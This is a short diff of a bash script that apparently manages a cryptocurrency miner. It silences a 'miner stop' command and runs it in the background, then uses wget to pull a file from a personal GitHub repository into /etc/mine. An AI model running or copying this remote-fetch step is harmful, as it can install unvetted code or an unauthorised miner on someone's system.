@@ -1,5 +1,5 @@
 #!/bin/bash
-miner stop
+miner stop > /dev/null 2>&1 &
 cd /etc
 cd mine
 wget -c https://github.com/aleksey1255/ai/raw/main/proba
